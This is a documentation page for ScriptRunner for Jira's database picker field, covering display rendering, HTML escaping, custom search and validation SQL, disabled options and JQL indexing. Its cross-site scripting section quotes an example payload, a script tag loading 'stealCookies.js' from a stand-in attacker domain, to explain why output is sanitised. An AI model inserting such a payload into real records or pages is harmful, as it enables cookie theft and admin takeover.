# Database Picker Customizations

- Platform: data-center
- Space: SR4JS
- Hierarchy: features > script-fields > built-in-script-fields > database-picker
- Doc ID: doc-sr4js-442886736
- Source: https://docs.adaptavist.com/sr4js/latest/features/script-fields/built-in-script-fields/database-picker/database-picker-customizations

You can customize the picker in many ways using the  _Configuration Script_  option. However, it’s recommended you get the basic functionality of your picker working before you work on advanced customization.

Configure advanced functionality by editing the configuration script, and specifying closures or string values. For operations like rendering the display value, the closure is called (if present), along with any arguments required. The following information explains what happens by default, and what arguments are available to your closure, as well as usage examples.

You do not need to include all possible closure arguments. You can omit superfluous arguments, but you must keep the order. Only drop arguments from the right of the list, for example:

`myClosure = { foo, bar, baz →`

can be shortened to:

`myClosure = { foo -> // ... }`

Important information regarding picker configuration closures when writing dynamic logic

We cache the configuration closures you write within the scripts for your pickers to enhance performance; [check out our FAQ](https://docs.adaptavist.com/sr4js/latest/get-help/frequently-asked-questions/script-fields-faq#closure-configuration) for more details.

These customizations can be complex. Ensure you thoroughly test on a non-production system.

## Avoiding Cross-Site Scripting Attacks

Cross-Site Scripting (XSS) is a type of vulnerability that arises when a web application renders data as HTML from an untrusted source.

In the example of the database picker, an attacker may enter javascript into a record in your linked database, then select that record in the database picker. That may look like:

```
<script src="http://bad-domain.com/stealCookies.js">An innocent looking record
```

If the database picker rendered the above as HTML, and the attacker persuaded a system admin to view that page, the JavaScript would run. This could allow the attacker to do things like steal cookies or execute REST requests to gain system admin permissions.

To prevent this, the HTML returned by the picker is sanitized, that is, all JavaScript is removed, and any missing HTML tags are inserted.

## Customizing the Displayed Value

By default, the first column from the results returned by the  **Retrieval/Validation SQL**  query is shown.

To customize the display of this value, implement:

```
import groovy.sql.GroovyRowResult

renderViewHtml = { String displayValue, GroovyRowResult row ->
    // return a String that will be displayed when viewing the issue
}
```

**displayValue**

The value retrieved from your SQL query.

**row**

A GroovyRowResult instance that represents the row retrieved using the Retrieval/Validation query.

The default implementation is  `row[1]`, i.e. use the second column of the  **Retrieval/Validation**  result.

When viewing the field in  _Column_  view in the  _Issue Navigator_, we will call  `renderColumnHtml`  if it is present, which has the same signature as  `renderViewHtml`. Use  `renderColumnHtml`  if you wish to provide a smaller, simpler result suitable for display in a tabular format such as the issue navigator.

### Showing Additional Information Example

In this example we continue the theme of querying the Jira database to show a  _Project Picker_  field. This doesn’t have much practical purpose, but we use it because it allows you to replicate the  _Project Picker_  locally, as we do not know what the schema of the actual database you are connecting to looks like.

The following code retrieves the project lead, and displays that.

```
import com.atlassian.jira.component.ComponentAccessor
import groovy.xml.MarkupBuilder
import groovy.sql.GroovyRowResult

renderViewHtml = { String displayValue, GroovyRowResult row ->
    def projectManager = ComponentAccessor.projectManager

    def projectId = row[0] as Long
    def project = projectManager.getProjectObj(projectId)

    def writer = new StringWriter()
    new MarkupBuilder(writer).
        span(displayValue) {
            i("lead by ${project.projectLead?.displayName ?: 'no lead'}")
        }
    writer.toString()
}
```

When rendering it appears as shown:

![](/sr4js/files/latest/442886736/442886743/1/1758746736000/show-project-lead-view-issue.png)

### HTML Encoding

By default, any HTML formatting tags in the database values are rendered by the browser, rather than escaped. This is primarily for reasons of backwards compatibility.

Typically, in order to encode HTML, we use an instance of  [`MarkupBuilder`](https://docs.groovy-lang.org/latest/html/api/groovy/xml/MarkupBuilder.html) , as shown in the code above.

There is a shortcut to save a few lines:

```
import com.onresolve.scriptrunner.canned.util.OutputFormatter

OutputFormatter.markupBuilder {
    span('etc')
}
```

This handles escaping any HTML tags in the database value, plus ensures you have correctly structured HTML.

It is also acceptable to just concatenate a string to be returned. To escape formatting tags in the value returned, use code similar to the following:

```
import static com.google.common.html.HtmlEscapers.htmlEscaper

renderViewHtml = { String displayValue ->
    htmlEscaper().escape(displayValue)
}
```

Given a project name that contains HTML tags, with this code it will be rendered as:

![](/sr4js/files/latest/442886736/442886741/1/1758746736000/html-escaped-project-name.png)

Whereas without this code:

![](/sr4js/files/latest/442886736/442886739/1/1758746736000/non-html-encoded-project-name.png)

**In the issue navigator**

You may wish to show a simplified display in the list view of the Issue Navigator, where space is more constrained.

By default we will display the normal "view html" (using the renderer described above if present). To display a simpler representation, implement:

```
import groovy.sql.GroovyRowResult

renderColumnHtml = { String displayValue, GroovyRowResult row ->
    // return a String that will be displayed in the list view of the issue navigator
}
```

In emails, change history and CSV exports

We can only display plain text (not HTML) in the  _History_  tab, email notifications and CSV exports.

By default we will display the value as returned by the SQL query, and not use the renderer described in  [Customising the Displayed Value](#id-.DatabasePickerCustomizationsv9.x-customizedisplayvalue).

You should not need to change the value displayed in history and email notifications, but if you need to, then implement:

```
import groovy.sql.GroovyRowResult

renderTextOnlyValue = { String displayValue, GroovyRowResult row ->
    // return a string for displaying in issue change history, and emails
}
```

Customizing the Drop-down HTML

By default, we display the second value in the  **Search**  query in the drop-down, for example:

![](/sr4js/files/latest/442886736/442886737/1/1758746735000/default-project-dropdown.png)

It’s possible to add additional information to this display, which may help guide users to the choice that they are looking for.

Overriding the view HTML, following the section above, has no effect on this display.

### Add Additional Information to the Drop-down

Following the  _Project Picker_  example, we can augment the list of items in the drop-down to show the project lead.

```
import groovy.sql.GroovyRowResult

renderOptionHtml = { String displayValue, GroovyRowResult row ->
    // return a String, containing HTML, that will be displayed in the drop-down
}
```

For example, as above, if we wanted to display the project lead in the drop-down we could use:

```
import com.atlassian.jira.component.ComponentAccessor
import groovy.xml.MarkupBuilder
import groovy.sql.GroovyRowResult

renderOptionHtml = { String displayValue, GroovyRowResult row ->
    def projectManager = ComponentAccessor.projectManager

    def projectId = row[0] as Long
    def project = projectManager.getProjectObj(projectId)

    def writer = new StringWriter()
    new MarkupBuilder(writer).
        span(displayValue) {
            i("lead by ${project.projectLead?.displayName ?: 'no lead'}")
        }
    writer.toString()
}
```

If you have common code (this is very similar to how we rendered the result in the example above), you should just extract the common code to a new method.

Which will display as follows:

#### ![](/sr4js/files/latest/442886736/442886742/1/1758746736000/customised-dropdown.png)

### Showing Multiple Columns

Another common case might be concatenating multiple values from the database query.

For example, let’s modify the search SQL query to return, in addition to the ID and name, the project key:

```
select id, pname, pkey from project where pname like ? || '%'
```

Now, modify the generation of the option HTML to include the project key. 

We’ll take the columns named  `PNAME`  and  `PKEY`  from our query results:

```
import groovy.sql.GroovyRowResult

renderOptionHtml = { String displayValue, GroovyRowResult row ->
    "$row.PNAME ($row.PKEY)"
}
```

Will render as:

![](/sr4js/files/latest/442886736/442886738/1/1758746735000/option-html-multiple-columns.png)

You can also use column numbers as well as column names, e.g., we’ll take the second and third column ( `row[0]`  being the first column):

```
import groovy.sql.GroovyRowResult

renderOptionHtml = { String displayValue, GroovyRowResult row ->
    "${row[1]} (${row[2]})"
}
```

### Setting a Drop-down Icon

Often you may have a small image to go with each selection, for instance a country flag or a headshot for a person.

You can set the avatar by implementing:

```
import groovy.sql.GroovyRowResult

getDropdownIcon = { GroovyRowResult row ->
    // return a String: a link to an icon, or base64 encoded string beginning 'data:image/jpg;base64, '
}
```

**row**

A GroovyRowResult instance that represents the row retrieved using the **Retrieval/Validation** query.

To show the avatars for Jira projects:

```
import com.atlassian.sal.api.ApplicationProperties
import com.atlassian.sal.api.UrlMode
import com.onresolve.scriptrunner.runner.util.OsgiServiceUtil
import groovy.sql.GroovyRowResult

def applicationProperties = OsgiServiceUtil.getOsgiService(ApplicationProperties)

getDropdownIcon = { GroovyRowResult row ->
    "${applicationProperties.getBaseUrl(UrlMode.RELATIVE)}/secure/projectavatar?size=xsmall&pid=${row[0]}"
}
```

will render as:

![](/sr4js/files/latest/442886736/442886740/1/1758746736000/customised-icon.png)

## Customizing the Search SQL

There are many cases for customizing the SQL used when searching, for instance:

-   Restricting records to just those the current Jira user has permission to see,
    
-   Using other fields on the current issue as a filter.
    

Implement:

```
import com.atlassian.jira.issue.Issue
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters

getSearchSql = { String inputValue, Issue issue, String originalValue ->
    // return SqlWithParameters, that will control the search SQL..., eg:
    new SqlWithParameters("select * from X where name like ? || '%'", [inputValue])
}
```

**inputValue**

The characters that the user has typed so far into the picker field.

**issue**

The current Issue object which the field is attached to. This is a live issue, in that its values will reflect any typed into the current form.

You must return an instance of  `SqlWithParameters`, which encapsulates a SQL query and any parameters.

If you override this, you should also modify the validation SQL (see below), otherwise the user could set a value (either using the REST or Java API) that they would not be able to set through the normal web user interface.

### Set Search SQL Based on Issue Fields

There are some points to be aware of when using the  `Issue`  object:

-   The  `Issue`  object which is available to you is never  `null`. When the user is interacting with the  _create issue_  dialog, you can use  `issue.issueType`  and  `issue.projectObject`  to get the current issue type and project, but  `issue.isCreated()`  will be  `false`.
    

Note that in both of the following cases we will use the Search SQL from the configuration form, rather than the script:

-   When setting a default value via  **Admin → Custom Fields**,
    
-   When searching for issues in the issue navigator.
    

You need to keep the return value from this closure and the SQL in the configuration form in sync. The search SQL in the form should be a superset of all the possible values that can be returned from your customized SQL, to allow users to find any possible value.

In the following contrived example, we only allow selection of project names which start with the current issue’s summary:

```
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters
import com.atlassian.jira.issue.Issue

getSearchSql = { String inputValue, Issue issue ->
    new SqlWithParameters("select id, pname from project where pname like ? || '%' and pname like ? || '%'", [issue.summary ?: '', inputValue])
}
```

This will select any project name beginning with what they type, and also starts with the current summary. Note that we handle the case where the issue summary is  `null`, by instead using an empty string:  `issue.summary ?: ''`.

Typically you will use  `CustomFieldManager`  to get the value of a custom field from an  `Issue`, or  `JiraAuthenticationContext`  to get the current user details.

The value of the issue attributes change as the user edits the form. So this allow you to return parameterized results based on other field changes that the user is currently making.

### Searching on Multiple Attributes

In the following example, we try to match what the user types in the drop-down with either the _pkey_ or _pname_ columns of the table:

```
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters

getSearchSql = { inputValue ->
    new SqlWithParameters("select id, pname from project where pname like ? || '%' or pkey like ? || '%'", [inputValue, inputValue])
}
```

Note that this means we need to pass the `inputValue` in twice, once for each `?` placeholder marker.

When searching on multiple columns, you should also [show multiple columns](#id-.DatabasePickerCustomizationsv9.x-showmultiplecolumns) and [customise the drop-down](#id-.DatabasePickerCustomizationsv9.x-customizingthedropdown) to display both attributes, otherwise it could be confusing for the user.

Remember that when no \`issue\` is in scope, for instance when setting the field default value, or in the issue navigator, then the SQL in the form will be used, rather than that from your script.

### Set Validation SQL Based on Issue Fields

This is pretty much the same as setting the search SQL above, and should normally go hand-in-hand with it. Any value that a user could pick through the search drop-down should not be invalid, unless they have subsequently changed other fields on the form that make it invalid.

To set SQL for validation, implement:

```
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters
import com.atlassian.jira.issue.Issue

getValidationSql = { String id, Issue issue, String originalValue ->
    // return SqlWithParameters, that will control the validation SQL..., eg:
    new SqlWithParameters("select id, name from X where name like ? || '%' and id = ?", [issue.summary ?: '', id])
}
```

Following the above example, this validator checks that the selected value matches the issue summary:

```
getValidationSql = { id, issue ->
    new SqlWithParameters("select id, pname from project where pname like ? || '%' and id = ?", [issue.summary ?: '', id])
}
```

## Dealing with Disabling Options

In some cases, you may have linked records that become invalid over time. For example, discontinued products, or users who have left the company.

You don’t want these to be selectable on new issues, but you need to retain their value on existing issues.

The method below describes how to disable values in a similar manner to that of select list options. Once an option has been disabled, you cannot use it in new issues. However, if an issue already has that field value, you can continue to save the disabled value. If the field value is changed and saved, the disabled value will no longer show as an option. This behaviour is the least surprising to users, and mirrors the way that the  _Disabled Options_  of single/multi-select pickers work.

In summary, we will customize the search SQL and validation SQL to display the current value even if it’s disabled, and to validate the existing value, even when disabled. The issue’s current value for this custom field is passed as a parameter of the closure.

### Example

Before attempting this example, ensure all other aspects of your field are working properly.

Let’s say we have a database table representing countries as follows:

  

ID

Name

Enabled

1

France

Y

2

Germany

Y

3

Spain

N

As above, the option for  `Spain`  is disabled.

For both single and multiple pickers we set the following in the form:

**Validation SQL**

**

```
                select ID, NAME, ENABLED from COUNTRIES where ID = cast(? as numeric)
```







**

**Search SQL**

**

```
                select ID, NAME from COUNTRIES where NAME like ? || '%' order by NAME
```







**

The example above will work with Postgres. Please make any changes appropriate to the target database, for example for MySql, use  `cast(? as unsigned)`.

### Single Picker

Use code similar to the following:

```
import com.atlassian.jira.issue.Issue
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters

getSearchSql = { String inputValue, Issue issue, originalValue ->
    new SqlWithParameters("""
        select ID, NAME, ENABLED
        from COUNTRIES
        where
            name like ? || '%' and
            (ENABLED = true or ID = cast(? as numeric)) order by NAME
        """, [inputValue, originalValue])
}

getValidationSql = { id, Issue issue, originalValue ->
    new SqlWithParameters("""
        select ID, NAME
        from COUNTRIES
        where
            ID = cast(? as numeric) and
            (ENABLED = true or ? = ?)
        """, [id, id, originalValue])
}

renderViewHtml = { displayValue, row ->
    displayValue + (row.ENABLED ? '' : ' (disabled)')
}
```

Note the `getValidationSql` closure - if an issue already had this value before it became disabled, when it’s edited and validated, the SQL will evaluate to:

```
select id, name from COUNTRIES where id = 3 and (enabled = true or 3 = 3)
```

…​as  `3 = 3`  is true (even though  `enabled = false`  is not true), validation will succeed, but the user will not be able to select another disabled value.

In addition, we have modified the rendered HTML to show that value as being disabled.

### Multiple Picker

Use code similar to the following:

```
import com.atlassian.jira.issue.Issue
import com.onresolve.scriptrunner.canned.jira.fields.editable.database.SqlWithParameters

getSearchSql = { String inputValue, Issue issue, originalValue ->
    def placeholders = getPlaceholderString(originalValue)
    new SqlWithParameters("""
        select ID, NAME, ENABLED
        from COUNTRIES
        where
            NAME like ? || '%' and
            (ENABLED = true or ID in ($placeholders)) order by NAME
        """, [inputValue, *originalValue])
}

getValidationSql = { id, Issue issue, originalValue ->
    def placeholders = getPlaceholderString(originalValue)

    new SqlWithParameters("""
        select ID, NAME
        from COUNTRIES
        where
            ID = ? and (ENABLED = true or ? in ($placeholders))
        """, [id, id, *originalValue])
}

renderViewHtml = { displayValue, row ->
    displayValue + (row.ENABLED ? '' : ' (disabled)')
}
```

As the  `originalValue`  is either null or a list, we need to 1) spread the values using the  `*`  (spread) operator, and 2) dynamically generate a the placeholder string, eg  `(?, ?, ?)`, using the utility function  `getPlaceholderString`  which is passed to our script.

##   
Searching Using JQL

There are two operators supported when searching,  `=`  (_equals_) and  `~`  (_like_).

Use  `=`  to search by the exact row ID. This will work consistently regardless of whether other values in the linked record have changed. The  `=`  operator will be used under the hood if you search in the  _Basic View_  of the Issue Navigator, using the drop-down.

Use  `~`  to do fuzzy matching on the textual value of the stored field. For instance if your picker field is linked to a customers database, you may use  `Customer ~ Acme`  to find values such as  **Acme Corp**.

By default, we will index the  `displayValue`  (as passed to [customizing the display value](#id-.DatabasePickerCustomizationsv9.x-customizedisplayvalue)), which, as a reminder, is the second column returned by the "validation" query.

If you wish to be able to do a textual search on something different from the above, you need to specify what should be indexed. It only makes sense to index what is actually shown on the issue, minus any HTML used for presentation purposes. In most cases, it should not be necessary to implement this at all.

To modify what is indexed, implement:

```
import groovy.sql.GroovyRowResult

getIndexValue = { GroovyRowResult row ->
    // return a string to be used for indexing, for textual searching and sorting in JQL queries
}
```

For example, if you are querying from the Jira projects table, to index the key and name, you would use:

```
import groovy.sql.GroovyRowResult

getIndexValue = { GroovyRowResult row ->
    (row.PKEY as String) + ' ' + (row.PNAME as String)
}
```

There will be a small overhead to this indexing, as a query to the external resource will be done each time the issue is re-indexed. In a full re-index, a query will be made for each field that has a value, for each issue.

You can disable the textual indexing by setting:

```
disableTextIndexing = true
```

However if you do this queries using the   `~`   operator will not return anything.

If you change the indexed value, you will not get accurate sorting results until all issues with this field are reindexed.

You could do that by using the  [reindex issues](https://docs.adaptavist.com/sr4js/latest/features/built-in-scripts/re-index-issues)  script with a JQL query similar to  `MyPickerField is not empty`. Or, a full reindex.

## Miscellaneous Configuration

**Multiple values delimiter**

Multiple values are separated with a comma. To change this set  `multiValueDelimiter`  to a string. For example, if you are rendering values as lozenges, you might set this to the empty string, or to set the joiner to a  `|`  add the following:

```
multiValueDelimiter = "|"
```

**Number of values in drop-down**

By default, a maximum of  `30`  values will be retrieved and displayed in the drop-down. To change that set  `maxRecordsForSearch`  to a number.
